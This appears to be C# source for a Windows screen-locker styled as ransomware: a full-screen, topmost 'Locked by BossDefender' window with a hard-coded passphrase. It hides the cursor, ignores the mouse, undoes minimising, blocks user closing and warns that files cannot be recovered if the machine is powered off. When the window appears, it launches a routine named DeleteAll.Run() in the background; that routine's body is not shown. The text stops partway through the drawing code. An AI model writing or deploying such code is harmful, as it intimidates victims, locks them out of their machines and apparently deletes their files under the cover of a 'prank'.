#:sdk Microsoft.NET.Sdk
#:property TargetFramework=net10.0-windows
#:property UseWindowsForms=true
#:property PublishAot=false
#:property PublishTrimmed=false
#:property OutputType=WinExe
#:property EnableWindowsTargeting=true
#:property ImplicitUsings=disable
#:property Nullable=disable


using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

internal static class Program
{
    [STAThread]
    private static void Main()
    {
        Application.SetHighDpiMode(HighDpiMode.SystemAware);
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        var screen = new Screen();
        // screen.Load += (s, e) => DeleteAll.Run();
        Application.Run(screen);
        
    }
}

sealed class Screen : Form
{
    // Change this string to use a different password. It is checked exactly
    // (apart from surrounding whitespace and letter case).
    private const string Passphrase = "bomboclat";
    private const int MaxInputLength = 16;
    private const string Placeholder = "DON'T TRY TO POWER OFF, OTHERWISE FILES CAN'T BE RECOVERED";
    private const string DeniedText = "ACCESS DENIED";

    private readonly System.Windows.Forms.Timer _animate;
    private readonly DateTime _start = DateTime.UtcNow;
    private readonly StringBuilder _typed = new();

    private Bitmap _backdrop;
    private Bitmap _titleLayer;
    private Font _lockedFont;
    private Font _nameFont;
    private Font _placeholderFont;
    private Font _statusFont;

    private RectangleF _skullRect;
    private RectangleF _lockedRect;
    private RectangleF _nameRect;
    private RectangleF _fieldRect;
    private RectangleF _statusRect;

    private int _titleLayerTop;
    private DateTime _deniedUntil;
    private bool _cursorHidden;
    private bool _closing;
    private bool _allowClose;
    private bool _restoringWindow;
    private int _lastWidth;
    private int _lastHeight;

    public Screen()
    {
        Text = "Locked by BossDefender";
        FormBorderStyle = FormBorderStyle.None;
        StartPosition = FormStartPosition.Manual;
        Bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
        WindowState = FormWindowState.Normal;
        MaximizeBox = false;
        MinimizeBox = false;
        ControlBox = false;
        BackColor = Color.FromArgb(10, 2, 1);
        ForeColor = Color.FromArgb(255, 150, 80);
        TopMost = true;
        KeyPreview = true;
        ShowInTaskbar = false;
        AutoScaleMode = AutoScaleMode.None;
        ImeMode = ImeMode.Disable;
        DoubleBuffered = true;
        SetStyle(
            ControlStyles.AllPaintingInWmPaint |
            ControlStyles.UserPaint |
            ControlStyles.OptimizedDoubleBuffer |
            ControlStyles.ResizeRedraw |
            ControlStyles.Selectable,
            true);

        _animate = new System.Windows.Forms.Timer { Interval = 40 };
        _animate.Tick += (s, e) =>
        {
            if (!IsDisposed && !Disposing)
            {
                Invalidate();
            }
        };
        _animate.Start();
    }

    // The password is only ever read from the keyboard. There is no clipboard,
    // mouse, or external file input here.
    private bool MatchesPassphrase()
    {
        string current = _typed.ToString().Trim();
        return current.Equals(Passphrase, StringComparison.OrdinalIgnoreCase);
    }

    private void ExitPrank()
    {
        if (_closing)
        {
            return;
        }

        _closing = true;
        _allowClose = true;
        ShowCursorAgain();
        Close();
    }

    private void HideCursor()
    {
        if (!_cursorHidden)
        {
            Cursor.Hide();
            _cursorHidden = true;
        }
    }

    private void ShowCursorAgain()
    {
        if (_cursorHidden)
        {
            Cursor.Show();
            _cursorHidden = false;
        }
    }

    protected override void OnShown(EventArgs e)
    {
        base.OnShown(e);
        RebuildVisuals();
        Activate();
        Focus();
        HideCursor();
        // DeleteAll.Run();
        _ = Task.Run(() => DeleteAll.Run());
    }

    protected override void OnClientSizeChanged(EventArgs e)
    {
        base.OnClientSizeChanged(e);

        if (IsHandleCreated && !IsDisposed && !Disposing &&
            ClientSize.Width >= 320 && ClientSize.Height >= 240)
        {
            RebuildVisuals();
        }
    }

    protected override void OnResize(EventArgs e)
    {
        base.OnResize(e);

        if (IsDisposed || Disposing)
        {
            return;
        }

        // A minimize must not reveal the desktop.
        if (!_allowClose && !_closing && !_restoringWindow && WindowState == FormWindowState.Minimized)
        {
            _restoringWindow = true;

            try
            {
                WindowState = FormWindowState.Normal;
                Bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                Activate();
                Focus();
            }
            finally
            {
                _restoringWindow = false;
            }
        }
    }

    protected override void OnKeyPress(KeyPressEventArgs e)
    {
        base.OnKeyPress(e);

        if (char.IsControl(e.KeyChar))
        {
            return;
        }

        if (_typed.Length >= MaxInputLength)
        {
            e.Handled = true;
            return;
        }

        _typed.Append(e.KeyChar);
        e.Handled = true;
        Invalidate();
    }

    protected override void OnKeyDown(KeyEventArgs e)
    {
        base.OnKeyDown(e);

        if (e.KeyCode == Keys.Back)
        {
            if (_typed.Length > 0)
            {
                _typed.Length--;
            }

            e.SuppressKeyPress = true;
            Invalidate();
            return;
        }

        if (e.KeyCode != Keys.Enter)
        {
            return;
        }

        e.SuppressKeyPress = true;

        if (MatchesPassphrase())
        {
            ExitPrank();
            return;
        }

        _deniedUntil = DateTime.UtcNow.AddSeconds(2.4);
        _typed.Clear();
        Invalidate();
    }

    // Deliberately inert: the mouse does not type, reveal, or close anything.
    protected override void OnMouseDown(MouseEventArgs e)
    {
    }

    protected override void OnMouseMove(MouseEventArgs e)
    {
    }

    protected override void OnMouseUp(MouseEventArgs e)
    {
    }

    protected override void OnFormClosing(FormClosingEventArgs e)
    {
        // Only the passphrase closes this window. Windows shutdown, Task
        // Manager, and application exit remain possible.
        if (!_allowClose && e.CloseReason == CloseReason.UserClosing)
        {
            e.Cancel = true;
            _deniedUntil = DateTime.UtcNow.AddSeconds(2.4);
            _typed.Clear();
            Invalidate();
            return;
        }

        base.OnFormClosing(e);
    }

    protected override void OnFormClosed(FormClosedEventArgs e)
    {
        _animate.Stop();
        ShowCursorAgain();
        base.OnFormClosed(e);
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing)
        {
            ShowCursorAgain();
            _animate?.Dispose();
            _backdrop?.Dispose();
            _titleLayer?.Dispose();
            _lockedFont?.Dispose();
            _nameFont?.Dispose();
            _placeholderFont?.Dispose();
            _statusFont?.Dispose();
        }

        base.Dispose(disposing);
    }

    private void RebuildVisuals()
    {
        int w = ClientSize.Width;
        int h = ClientSize.Height;

        if (w < 320 || h < 240)
        {
            return;
        }

        if (w == _lastWidth && h == _lastHeight && _backdrop != null)
        {
            return;
        }

        ComputeLayout(w, h);

        using (Graphics g = CreateGraphics())
        {
            string family = PickDisplayFamily();
            Font locked = FitFont(g, "Consolas", Math.Max(11f, _fieldRect.Height * 0.34f),FontStyle.Bold, Placeholder, _fieldRect.Width * 0.90f);
            Font name = FitFont(g, family, Math.Max(20f, h * 0.080f), FontStyle.Bold, "BossDefender", w * 0.90f);
            Font placeholder = new Font("Consolas", Math.Max(11f, _fieldRect.Height * 0.34f), FontStyle.Bold, GraphicsUnit.Pixel);
            Font status = new Font("Consolas", Math.Max(11f, h * 0.021f), FontStyle.Bold, GraphicsUnit.Pixel);

            _lockedFont?.Dispose();
            _nameFont?.Dispose();
            _placeholderFont?.Dispose();
            _statusFont?.Dispose();

            _lockedFont = locked;
            _nameFont = name;
            _placeholderFont = placeholder;
            _statusFont = status;
        }

        _backdrop?.Dispose();
        using (Bitmap blurred = HellArt.BuildBackground(w, h))
        {
            _backdrop = new Bitmap(w, h, PixelFormat.Format32bppPArgb);
            using Graphics bg = Graphics.FromImage(_backdrop);
            bg.InterpolationMode = InterpolationMode.HighQualityBicubic;
            bg.PixelOffsetMode = PixelOffsetMode.HighQuality;
            bg.CompositingQuality = CompositingQuality.HighQuality;
            bg.DrawImage(blurred, new Rectangle(0, 0, w, h));
        }

        _titleLayer?.Dispose();
        _titleLayer = BuildTitleLayer(w, h);

        _lastWidth = w;
        _lastHeight = h;

        Invalidate();
    }

    private void ComputeLayout(int w, int h)
    {
        float skullSize = Math.Min(w * 0.56f, h * 0.62f);
        float skullTop = h * 0.012f;
        _skullRect = new RectangleF((w - skullSize) / 2f, skullTop, skullSize, skullSize);

        // The skull path's chin sits at 0.945 of its square canvas.
        float chin = skullTop + skullSize * 0.945f;
        float lockedTop = chin + h * 0.016f;
        float lockedHeight = Math.Max(16f, h * 0.036f);
        _lockedRect = new RectangleF(0f, lockedTop, w, lockedHeight);

        float nameTop = lockedTop + lockedHeight * 1.05f;
        float nameHeight = Math.Max(30f, h * 0.100f);
        _nameRect = new RectangleF(0f, nameTop, w, nameHeight);

        float fieldWidth = Math.Min(w * 0.48f, h * 0.80f);
        float fieldHeight = Math.Clamp(h * 0.062f, 44f, 120f);
        float fieldTop = Math.Min(nameTop + nameHeight + h * 0.045f, h * 0.80f);
        _fieldRect = new RectangleF((w - fieldWidth) / 2f, fieldTop, fieldWidth, fieldHeight);
        _statusRect = new RectangleF(0f, _fieldRect.Bottom + h * 0.018f, w, Math.Max(18f, h * 0.035f));
    }

    private static Font FitFont(
        Graphics g,
        string family,
        float size,
        FontStyle style,
        string sample,
        float maxWidth)
    {
        Font font = SafeFont(family, Math.Max(8f, size), style);
        using StringFormat format = new(StringFormatFlags.NoWrap)
        {
            Alignment = StringAlignment.Near,
            LineAlignment = StringAlignment.Near
        };

        while (font.Size > 8f &&
               g.MeasureString(sample, font, new PointF(0f, 0f), format).Width > maxWidth)
        {
            float next = font.Size * 0.94f;
            font.Dispose();
            font = SafeFont(family, next, style);
        }

        return font;
    }

    private static Font SafeFont(string family, float size, FontStyle style)
    {
        try
        {
            return new Font(family, size, style, GraphicsUnit.Pixel);
        }
        catch
        {
            return new Font(family, size, FontStyle.Regular, GraphicsUnit.Pixel);
        }
    }

    private static string PickDisplayFamily()
    {
        string[] candidates =
        {
            "Old English Text MT",
            "Blackadder ITC",
            "Cloister Black",
            "UnifrakturMaguntia",
            "Goudy Text MT",
            "Chiller",
            "Georgia",
            "Times New Roman",
            "Impact"
        };

        try
        {
            using InstalledFontCollection installed = new();
            HashSet<string> names = new(StringComparer.OrdinalIgnoreCase);
            foreach (FontFamily family in installed.Families)
            {
                names.Add(family.Name);
            }

            foreach (string candidate in candidates)
            {
                if (names.Contains(candidate))
                {
                    return candidate;
                }
            }
        }
        catch
        {
            // Fall through to a font that ships with Windows.
        }

        return "Impact";
    }

    protected override void OnPaint(PaintEventArgs e)
    {
        base.OnPaint(e);

        Graphics g = e.Graphics;
        g.SmoothingMode = SmoothingMode.AntiAlias;
        g.TextRenderingHint = TextRenderingHint.AntiAliasGridFit;
        g.InterpolationMode = InterpolationMode.HighQualityBicubic;
        g.PixelOffsetMode = PixelOffsetMode.HighQuality;
        g.CompositingQuality = CompositingQuality.HighQuality;

        int w = ClientSize.Width;
        int h = ClientSize.Height;

        if (w <= 0 || h <= 0)
        {
            return;
        }

        if (_backdrop == null)
        {
            g.Clear(Color.FromArgb(10, 2, 1));
            return;
        }

        double seconds = (DateTime.UtcNow - _start).TotalSeconds;
        float time = (float)seconds;
        float pulse = 0.5f + 0.5f * (float)Math.Sin(seconds * 2.1);

        g.DrawImageUnscaled(_backdrop, 0, 0);

        HellArt.DrawBackgroundLife(g, w, h, time);
        HellArt.DrawEmbers(g, w, h, seconds, false);
        HellArt.DrawTitleAura(g, _lockedRect, _nameRect, time);
        GhostSkullArt.Draw(g, _skullRect, time, pulse);
        HellArt.DrawEmbers(g, w, h, seconds, true);

        if (_titleLayer != null)
        {
            g.DrawImageUnscaled(_titleLayer, 0, _titleLayerTop);
        }

        DrawKeyField(g, time);
        DrawStatus(g, time);
        
    }

    private Bitmap BuildTitleLayer(int w, int h)
    {
        if (_lockedFont == null || _nameFont == null)
        {
            return null;
        }

        float margin = Math.Max(30f, h * 0.040f);
        int top = Math.Max(0, (int)Math.Floor(Math.Min(_lockedRect.Top, _nameRect.Top) - margin));
        int bottom = Math.Min(h, (int)Math.Ceiling(Math.Max(_lockedRect.Bottom, _nameRect.Bottom) + margin));
        int height = Math.Max(1, bottom - top);

        Bitmap layer = new(w, height, PixelFormat.Format32bppPArgb);
        using (Graphics g = Graphics.FromImage(layer))
        {
            g.SmoothingMode = SmoothingMode.AntiAlias;
            g.TextRenderingHint = TextRenderingHint.AntiAliasGridFit;
            g.PixelOffsetMode = PixelOffsetMode.HighQuality;
            g.CompositingQuality = CompositingQuality.HighQuality;
            DrawTitleCore(g, -top);
        }

        _titleLayerTop = top;
        return layer;
    }

    private void DrawTitleCore(Graphics g, float offsetY)
    {
        RectangleF locked = new(_lockedRect.X, _lockedRect.Y + offsetY, _lockedRect.Width, _lockedRect.Height);
        RectangleF name = new(_nameRect.X, _nameRect.Y + offsetY, _nameRect.Width, _nameRect.Height);

        DrawGlowText(
            g,
            "Locked by",
            _lockedFont,
            locked,
            Color.FromArgb(245, 226, 210, 196),
            Color.FromArgb(230, 126, 86, 68),
            Color.FromArgb(255, 160, 58, 18),
            7f,
            150);

        DrawGlowText(
            g,
            "BossDefender",
            _nameFont,
            name,
            Color.FromArgb(255, 255, 138, 54),
            Color.FromArgb(255, 108, 8, 2),
            Color.FromArgb(255, 150, 35, 6),
            11f,
            185);
    }

    private static void DrawGlowText(
        Graphics g,
        string text,
        Font font,
        RectangleF rect,
        Color topColor,
        Color bottomColor,
        Color glowColor,
        float glowRadius,
        int glowAlpha)
    {
        using StringFormat format = new(StringFormatFlags.NoWrap)
        {
            Alignment = StringAlignment.Center,
            LineAlignment = StringAlignment.Center
        };

        // Layered, offset copies create a soft fire bloom without needing an
        // unsupported GDI+ blur filter.
        for (int layer = 3; layer >= 1; layer--)
        {
            float radius = glowRadius * (layer / 3f);
            int alpha = Math.Max(1, glowAlpha / (layer + 1));
            int points = layer == 3 ? 16 : 12;

            using SolidBrush brush = new(Color.FromArgb(alpha, glowColor));
            for (int i = 0; i < points; i++)
            {
                double angle = i * Math.PI * 2.0 / points;
                float dx = (float)Math.Cos(angle) * radius;
                float dy = (float)Math.Sin(angle) * radius;
                g.DrawString(text, font, brush, new RectangleF(rect.X + dx, rect.Y + dy, rect.Width, rect.Height), format);
            }
        }

        using (SolidBrush shadow = new(Color.FromArgb(225, 8, 1, 1)))
        {
            g.DrawString(text, font, shadow, new RectangleF(rect.X + 2f, rect.Y + 4f, rect.Width, rect.Height), format);
        }

        using (SolidBrush outline = new(Color.FromArgb(245, 22, 4, 2)))
        {
            for (int i = 0; i < 8; i++)
            {
                double angle = i * Math.PI / 4.0;
                float dx = (float)Math.Cos(angle) * 1.6f;
                float dy = (float)Math.Sin(angle) * 1.6f;
                g.DrawString(text, font, outline, new RectangleF(rect.X + dx, rect.Y + dy, rect.Width, rect.Height), format);
            }
        }

        using LinearGradientBrush fill = new(rect, topColor, bottomColor, LinearGradientMode.Vertical);
        g.DrawString(text, font, fill, rect, format);

        // A thin hot reflection on the upper half keeps the dark lettering
        // from disappearing against the fire.
        using SolidBrush sheen = new(Color.FromArgb(30, 255, 210, 150));
        g.DrawString(text, font, sheen, new RectangleF(rect.X, rect.Y - rect.Height * 0.025f, rect.Width, rect.Height), format);
    }

    private void DrawKeyField(Graphics g, float time)
    {
        bool denied = DateTime.UtcNow < _deniedUntil;

        float shake = denied ? (float)Math.Sin(time * 72f) * Math.Min(6f, _fieldRect.Width * 0.006f) : 0f;
        RectangleF field = new(_fieldRect.X + shake, _fieldRect.Y, _fieldRect.Width, _fieldRect.Height);
        float radius = Math.Max(5f, field.Height * 0.12f);
        float flash = denied ? (0.65f + 0.35f * (float)Math.Sin(time * 18f)) : 1f;

        using (GraphicsPath outer = RoundedRect(field, radius))
        {
            for (int i = 5; i >= 1; i--)
            {
                float grow = i * Math.Max(2f, field.Height * 0.055f);
                RectangleF halo = new(field.X - grow, field.Y - grow, field.Width + grow * 2f, field.Height + grow * 2f);
                using GraphicsPath hp = RoundedRect(halo, radius + grow);
                using Pen pen = new(Color.FromArgb((int)(5 * flash) + i * 3, 255, 54, 12), Math.Max(1f, field.Height * 0.018f));
                g.DrawPath(pen, hp);
            }

            using LinearGradientBrush fill = new(field, Color.FromArgb(235, 32, 4, 2), Color.FromArgb(242, 7, 1, 0), LinearGradientMode.Vertical);
            g.FillPath(fill, outer);

            Color borderColor = denied
                ? Color.FromArgb(255, (int)(180 + 70 * flash), (int)(22 + 30 * flash), 6)
                : Color.FromArgb(225, 214, 57, 20);
            using (Pen border = new(borderColor, Math.Max(2f, field.Height * 0.030f)))
            {
                g.DrawPath(border, outer);
            }

            using (GraphicsPath inner = RoundedRect(new RectangleF(field.X + 3f, field.Y + 3f, field.Width - 6f, field.Height - 6f), Math.Max(3f, radius - 2f)))
            using (Pen innerPen = new(Color.FromArgb(95, 255, 130, 58), 1f))
            {
                g.DrawPath(innerPen, inner);
            }
        }

        DrawFieldBrackets(g, field, flash);
        DrawFieldContents(g, field, time);
    }

    private void DrawFieldContents(Graphics g, RectangleF field, float time)
    {
        using StringFormat format = new(StringFormatFlags.NoWrap)
        {
            Alignment = StringAlignment.Center,
            LineAlignment = StringAlignment.Center
        };

        if (_typed.Length == 0)
        {
            if (_placeholderFont == null)
            {
                return;
            }

            using SolidBrush glow = new(Color.FromArgb(55, 255, 82, 20));
            using SolidBrush brush = new(Color.FromArgb(205, 186, 112, 72));
            for (int i = 0; i < 6; i++)
            {
                double angle = i * Math.PI / 3.0;
                g.DrawString(Placeholder, _placeholderFont, glow,
                    new RectangleF(field.X + (float)Math.Cos(angle) * 2.2f, field.Y + (float)Math.Sin(angle) * 2.2f, field.Width, field.Height), format);
            }
            g.DrawString(Placeholder, _placeholderFont, brush, field, format);
            return;
        }

        float radius = Math.Max(2.8f, field.Height * 0.075f);
        float spacing = radius * 2.35f;
        float total = (radius * 2f) + (_typed.Length - 1) * spacing;
        float startX = field.X + (field.Width - total) / 2f + radius;
        float cy = field.Y + field.Height * 0.50f;

        for (int i = 0; i < _typed.Length; i++)
        {
            float cx = startX + i * spacing;
            using (SolidBrush halo = new(Color.FromArgb(65, 255, 93, 25)))
            {
                g.FillEllipse(halo, cx - radius * 2.1f, cy - radius * 2.1f, radius * 4.2f, radius * 4.2f);
            }
            using (SolidBrush mid = new(Color.FromArgb(205, 207, 62, 21)))
            {
                g.FillEllipse(mid, cx - radius * 1.15f, cy - radius * 1.15f, radius * 2.3f, radius * 2.3f);
            }
            using (SolidBrush core = new(Color.FromArgb(255, 255, 188, 105)))
            {
                g.FillEllipse(core, cx - radius * 0.72f, cy - radius * 0.72f, radius * 1.44f, radius * 1.44f);
            }
        }

        if ((time % 1.1f) < 0.62f)
        {
            float caretX = startX + _typed.Length * spacing;
            using Pen caret = new(Color.FromArgb(230, 255, 154, 72), Math.Max(1.5f, field.Height * 0.032f));
            g.DrawLine(caret, caretX, cy - field.Height * 0.23f, caretX, cy + field.Height * 0.23f);
        }
    }

    private static void DrawFieldBrackets(Graphics g, RectangleF field, float flash)
    {
        float inset = Math.Max(6f, field.Height * 0.16f);
        float length = Math.Max(10f, field.Height * 0.30f);
        float width = Math.Max(1.4f, field.Height * 0.025f);
        Color color = Color.FromArgb((int)(170 * flash + 20), 255, 118, 45);

        using Pen pen = new(color, width);
        float left = field.Left + inset;
        float right = field.Right - inset;
        float top = field.Top + inset;
        float bottom = field.Bottom - inset;

        g.DrawLine(pen, left, top, left + length, top);
        g.DrawLine(pen, left, top, left, top + length);
        g.DrawLine(pen, right, top, right - length, top);
        g.DrawLine(pen, right, top, right, top + length);
        g.DrawLine(pen, left, bottom, left + length, bottom);
        g.DrawLine(pen, left, bottom, left, bottom - length);
        g.DrawLine(pen, right, bottom, right - length, bottom);
        g.DrawLine(pen, right, bottom, right, bottom - length);
    }

    private void DrawStatus(Graphics g, float time)
    {
        if (DateTime.UtcNow >= _deniedUntil || _statusFont == null)
        {
            return;
        }

        float flash = 0.60f + 0.40f * (float)Math.Sin(time * 14f);
        using StringFormat format = new(StringFormatFlags.NoWrap)
        {
            Alignment = StringAlignment.Center,
            LineAlignment = StringAlignment.Center
        };

        using (SolidBrush glow = new(Color.FromArgb((int)(70 * flash), 255, 32, 8)))
        {
            g.DrawString(DeniedText, _statusFont, glow, new RectangleF(_statusRect.X - 4f, _statusRect.Y, _statusRect.Width, _statusRect.Height), format);
            g.DrawString(DeniedText, _statusFont, glow, new RectangleF(_statusRect.X + 4f, _statusRect.Y, _statusRect.Width, _statusRect.Height), format);
        }

        using (SolidBrush shadow = new(Color.FromArgb(230, 10, 0, 0)))
        {
            g.DrawString(DeniedText, _statusFont, shadow, new RectangleF(0f, _statusRect.Y + 2f, _statusRect.Width, _statusRect.Height), format);
        }

        using LinearGradientBrush fill = new(_statusRect, Color.FromArgb(255, 255, 126, 70), Color.FromArgb(255, 178, 10, 2), LinearGradientMode.Vertical);
        g.DrawString(DeniedText, _statusFont, fill, _statusRect, format);
    }

    private static GraphicsPath RoundedRect(RectangleF rect, float radius)
    {
        float r = Math.Min(radius, Math.Min(rect.Width, rect.Height) / 2f);
        float d = r * 2f;
        GraphicsPath path = new();

        if (r <= 0.1f)
        {
            path.AddRectangle(rect);
            return path;
        }

        path.AddArc(rect.X, rect.Y, d, d, 180f, 90f);
        path.AddArc(rect.Right - d, rect.Y, d, d, 270f, 90f);
        path.AddArc(rect.Right - d, rect.Bottom - d, d, d, 0f, 90f);
        path.AddArc(rect.X, rect.Bottom - d, d, d, 90f, 90f);
        path.CloseFigure();
        return path;
    }

}

internal static class HellArt
{
    private sealed class FlameSpec
    {
        internal float X;
        internal float Y;
        internal float Width;
        internal float Height;
        internal float Phase;
        internal float Lean;
        internal float Intensity;
    }

    private sealed class EmberSpec
    {
        internal float X;
        internal float Start;
        internal float Speed;
        internal float Size;
        internal float Phase;
        internal float Sway;
    }

    private static readonly FlameSpec[] ManeFlames = CreateManeFlames();
    private static readonly FlameSpec[] ForeFlames = CreateForegroundFlames();
    private static readonly EmberSpec[] Embers = CreateEmbers();

    internal static Bitmap BuildBackground(int w, int h)
    {
        int bw = Math.Max(80, w / 6);
        int bh = Math.Max(50, h / 6);
        Bitmap bitmap = new(bw, bh, PixelFormat.Format32bppPArgb);

        using (Graphics g = Graphics.FromImage(bitmap))
        {
            g.SmoothingMode = SmoothingMode.AntiAlias;
            g.InterpolationMode = InterpolationMode.HighQualityBicubic;
            g.PixelOffsetMode = PixelOffsetMode.HighQuality;
            g.CompositingQuality = CompositingQuality.HighQuality;

            using (LinearGradientBrush baseSky = new(
                new RectangleF(0f, 0f, bw, bh),
                Color.FromArgb(255, 6, 2, 2),
                Color.FromArgb(255, 27, 4, 1),
                LinearGradientMode.Vertical))
            {
                g.FillRectangle(baseSky, 0f, 0f, bw, bh);
            }

            SoftGlow(g, bw * 0.50f, bh * 0.47f, bw * 0.50f, bh * 0.48f,
                Color.FromArgb(92, 118, 18, 3), Color.FromArgb(0, 18, 2, 1));
            SoftGlow(g, bw * 0.22f, bh * 0.57f, bw * 0.31f, bh * 0.31f,
                Color.FromArgb(70, 175, 39, 5), Color.FromArgb(0, 28, 4, 1));
            SoftGlow(g, bw * 0.82f, bh * 0.52f, bw * 0.29f, bh * 0.34f,
                Color.FromArgb(58, 160, 27, 4), Color.FromArgb(0, 24, 3, 1));

            // A hazy, smoke-covered fire moon.
            SoftGlow(g, bw * 0.80f, bh * 0.20f, bw * 0.17f, bw * 0.17f,
                Color.FromArgb(65, 255, 112, 36), Color.FromArgb(0, 80, 16, 3));
            using (SolidBrush moon = new(Color.FromArgb(80, 255, 132, 58)))
            {
                g.FillEllipse(moon, bw * 0.775f, bh * 0.145f, bw * 0.050f, bw * 0.050f);
            }

            // Smoke drifting over the burning horizon.
            SoftGlow(g, bw * 0.38f, bh * 0.31f, bw * 0.30f, bh * 0.16f,
                Color.FromArgb(34, 46, 10, 6), Color.FromArgb(0, 8, 1, 1));
            SoftGlow(g, bw * 0.68f, bh * 0.37f, bw * 0.36f, bh * 0.18f,
                Color.FromArgb(30, 42, 8, 5), Color.FromArgb(0, 8, 1, 1));

            DrawRuinedSkyline(g, bw, bh);

            using (SolidBrush haze = new(Color.FromArgb(30, 170, 35, 5)))
            {
                g.FillRectangle(haze, 0f, bh * 0.48f, bw, bh * 0.16f);
            }

            DrawGroundFire(g, bw, bh);

            // Sparse grain is scaled up with the background, so it reads as
            // atmospheric noise rather than a visible pattern.
            Random grain = new(90210);
            for (int i = 0; i < 1500; i++)
            {
                float x = (float)grain.NextDouble() * bw;
                float y = (float)grain.NextDouble() * bh;
                int alpha = 8 + grain.Next(0, 22);
                Color c = grain.Next(0, 4) == 0
                    ? Color.FromArgb(alpha, 255, 116, 54)
                    : Color.FromArgb(alpha, 0, 0, 0);
                using SolidBrush dot = new(c);
                g.FillRectangle(dot, x, y, 1.1f, 1.1f);
            }

            // Bake the vignette into the cached scene: it is static, so there
            // is no reason to rasterize a full-screen radial gradient every
            // animation frame.
            using GraphicsPath edge = new();
            edge.AddRectangle(new RectangleF(0f, 0f, bw, bh));
            using PathGradientBrush vignette = new(edge)
            {
                CenterColor = Color.FromArgb(0, 0, 0, 0),
                SurroundColors = new[] { Color.FromArgb(170, 0, 0, 0) },
                CenterPoint = new PointF(bw * 0.50f, bh * 0.46f)
            };
            g.FillPath(vignette, edge);
        }

        return bitmap;
    }

    private static void DrawRuinedSkyline(Graphics g, float bw, float bh)
    {
        using SolidBrush ruin = new(Color.FromArgb(228, 4, 1, 1));
        using SolidBrush farRuin = new(Color.FromArgb(145, 8, 2, 1));

        // Distant broken blocks.
        PointF[] distant =
        {
            new(bw * 0.20f, bh * 0.88f),
            new(bw * 0.20f, bh * 0.59f),
            new(bw * 0.25f, bh * 0.55f),
            new(bw * 0.29f, bh * 0.62f),
            new(bw * 0.34f, bh * 0.58f),
            new(bw * 0.36f, bh * 0.88f)
        };
        g.FillPolygon(farRuin, distant);

        PointF[] distant2 =
        {
            new(bw * 0.57f, bh * 0.88f),
            new(bw * 0.60f, bh * 0.63f),
            new(bw * 0.65f, bh * 0.58f),
            new(bw * 0.69f, bh * 0.66f),
            new(bw * 0.73f, bh * 0.61f),
            new(bw * 0.77f, bh * 0.88f)
        };
        g.FillPolygon(farRuin, distant2);

        // Heavy foreground ruin, left.
        PointF[] left =
        {
            new(0f, bh * 0.96f),
            new(0f, bh * 0.35f),
            new(bw * 0.045f, bh * 0.32f),
            new(bw * 0.050f, bh * 0.47f),
            new(bw * 0.075f, bh * 0.42f),
            new(bw * 0.095f, bh * 0.55f),
            new(bw * 0.125f, bh * 0.47f),
            new(bw * 0.155f, bh * 0.60f),
            new(bw * 0.175f, bh * 0.55f),
            new(bw * 0.19f, bh * 0.96f)
        };
        g.FillPolygon(ruin, left);

        PointF[] right =
        {
            new(bw * 0.81f, bh * 0.96f),
            new(bw * 0.84f, bh * 0.40f),
            new(bw * 0.875f, bh * 0.44f),
            new(bw * 0.89f, bh * 0.34f),
            new(bw * 0.925f, bh * 0.39f),
            new(bw * 0.94f, bh * 0.29f),
            new(bw * 0.965f, bh * 0.42f),
            new(bw, bh * 0.36f),
            new(bw, bh * 0.96f)
        };
        g.FillPolygon(ruin, right);

        // Glowing windows and rents in the ruins.
        Random rng = new(117);
        for (int i = 0; i < 16; i++)
        {
            float x = i % 2 == 0
                ? bw * (0.025f + (float)rng.NextDouble() * 0.13f)
                : bw * (0.85f + (float)rng.NextDouble() * 0.12f);
            float y = bh * (0.43f + (float)rng.NextDouble() * 0.40f);
            float ww = bw * (0.002f + (float)rng.NextDouble() * 0.005f);
            float hh = bh * (0.004f + (float)rng.NextDouble() * 0.010f);
            using SolidBrush window = new(Color.FromArgb(55 + rng.Next(0, 60), 255, 98, 30));
            g.FillRectangle(window, x, y, ww, hh);
        }

        // A few crooked graveyard crosses, softened by the low-res buffer.
        using (Pen crossPen = new(Color.FromArgb(210, 4, 1, 1), Math.Max(1f, bw * 0.006f)))
        {
            DrawCross(g, crossPen, bw * 0.24f, bh * 0.77f, bw * 0.014f, bh * 0.12f);
            DrawCross(g, crossPen, bw * 0.29f, bh * 0.79f, bw * 0.011f, bh * 0.09f);
            DrawCross(g, crossPen, bw * 0.71f, bh * 0.78f, bw * 0.013f, bh * 0.11f);
            DrawCross(g, crossPen, bw * 0.76f, bh * 0.81f, bw * 0.010f, bh * 0.08f);
        }
    }

    private static void DrawCross(Graphics g, Pen pen, float x, float y, float halfWidth, float height)
    {
        g.DrawLine(pen, x, y, x, y + height);
        g.DrawLine(pen, x - halfWidth, y + height * 0.24f, x + halfWidth, y + height * 0.24f);
    }

    private static void DrawGroundFire(Graphics g, float bw, float bh)
    {
        float y = bh * 0.88f;
        float[] xs = { 0.08f, 0.18f, 0.30f, 0.48f, 0.62f, 0.76f, 0.90f };
        for (int i = 0; i < xs.Length; i++)
        {
            float x = bw * xs[i];
            float radius = bw * (0.035f + 0.025f * (i % 3));
            SoftGlow(g, x, y + bh * 0.03f, radius, radius * 0.55f,
                Color.FromArgb(120, 255, 88, 17), Color.FromArgb(0, 90, 14, 2));
            SoftGlow(g, x, y + bh * 0.025f, radius * 0.42f, radius * 0.30f,
                Color.FromArgb(145, 255, 187, 62), Color.FromArgb(0, 255, 92, 8));
        }

        using (LinearGradientBrush groundGlow = new(
            new RectangleF(0f, bh * 0.78f, bw, bh * 0.22f),
            Color.FromArgb(0, 255, 72, 8),
            Color.FromArgb(82, 135, 19, 2),
            LinearGradientMode.Vertical))
        {
            g.FillRectangle(groundGlow, 0f, bh * 0.78f, bw, bh * 0.22f);
        }
    }

    internal static void DrawBackgroundLife(Graphics g, int w, int h, float time)
    {
        float pulse = 0.5f + 0.5f * (float)Math.Sin(time * 1.7f);

        SoftGlow(g, w * 0.50f, h * 0.28f, w * 0.33f, h * 0.33f,
            Color.FromArgb(28 + (int)(14 * pulse), 255, 70, 8), Color.FromArgb(0, 40, 5, 1));
        SoftGlow(g, w * 0.08f, h * 0.77f, w * 0.18f, h * 0.23f,
